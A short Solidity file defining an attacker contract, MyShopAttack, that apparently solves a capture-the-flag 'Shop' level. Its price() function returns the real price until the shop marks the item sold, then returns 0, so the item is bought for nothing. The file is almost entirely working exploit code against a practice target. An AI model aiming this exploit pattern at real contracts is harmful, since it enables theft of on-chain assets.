// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IBuyer {
    function buy() external;
    function price() external view returns (uint256 _price);
}

interface IShop {
    function buy() external;
    function price() external view returns (uint256 _price);
    function isSold() external view returns (bool sold);
}

contract MyShopAttack is IBuyer {
    IShop private _shop;
    constructor(address shopAddress) {
        _shop = IShop(shopAddress);
    }

    function buy() public override {
        _shop.buy();
    }

    function price() public view override returns (uint256 _price) {
        bool isSold = _shop.isSold();
        uint256 curPrice = _shop.price();
        return isSold ? 0 : curPrice + 1;
    }
}
